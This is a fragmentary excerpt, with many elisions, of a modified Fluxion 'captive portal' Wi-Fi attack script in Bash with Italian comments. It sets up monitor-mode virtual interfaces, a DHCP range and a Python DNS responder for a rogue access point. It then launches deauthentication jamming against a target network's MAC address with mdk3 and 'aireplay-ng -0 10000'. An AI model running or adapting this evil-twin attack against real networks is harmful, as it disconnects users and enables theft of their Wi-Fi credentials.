...
function captive_portal_run_interface() {
  ...
  echo "Select if your wifi adapter support virtualizzation"
  echo

  local choices=("$Virtualizzazione_NETGEAR" "$AWUS1900")
  io_query_choice "" choices[@]



  case "$IOQueryChoice" in
  "$Virtualizzazione_NETGEAR") wiAccessPoint="FX${1:2}AP" ;;
  "$AWUS1900") wiAccessPoint=$1  ;;
  esac


  # Create an identifier for the access point, AP virtual interface.
#  local wiAccessPoint="FX${1:2}AP"
##########################################################################################à ----->>>>>>  local wiAccessPoint=$1
#  local wiAccessPoint=$1   # AWUS1900
...
#######################################################################################################################################################################
  if [ "$wiAccessPoint" = "FX${1:2}AP" ]; then
 ...
 # Create the new virtual interface with the generated identifier.
   ...
   if ! iw phy $wiAccessPointDevice interface add $wiAccessPoint type monitor 2>$FLUXIONOutputDevice; then
    ...
    return 3
     ...
     #echo "$wiAccessPoint : riavvio..."
     sleep 2
     xterm -e 'sudo ifconfig '$wiAccessPoint' down && sudo iwconfig '$wiAccessPoint' mode monitor && sudo ifconfig '$wiAccessPoint' up' & 
  fi
...
subnet $VIGWNetwork.0 netmask 255.255.255.0 {
	...
	range $VIGWNetwork.100 $VIGWNetwork.250;
}\
...
if __name__ == '__main__':
  ...
  try:
    ...
    print 'Finalizando'
    udps.close()" >"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
...
function start_attack() {
  ...
  case "$IOQueryChoice" in
  "$Virtualizzazione_NETGEAR") 
  wiAccessPoint="${WIMonitor}" 

  echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
  echo -e "$APTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
  xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" -title "FLUXION AP Jammer Service [$APTargetSSID] [$wiAccessPoint]" -e "mdk3  $wiAccessPoint d -c $APTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
  CaptivePortalJammerServiceXtermPID=$! # Save parent's pid, to get to child later.'

  ;;
  "$AWUS1900")
  #iw dev $WIMonitor interface add ${WIMonitor}v type monitor


  if [ "$WIMonitor" == "wlan0" ]; then
      wiAccessPoint="wlan1"
  ...
  xterm -e "iw $wiAccessPoint set channel $APTargetChannel"
  sleep 2
  xterm $FLUXIONHoldXterm $BOTTOMRIGHT -e "aireplay-ng -0 10000 -a $APTargetMAC $WIMonitor"  &
  sleep 5
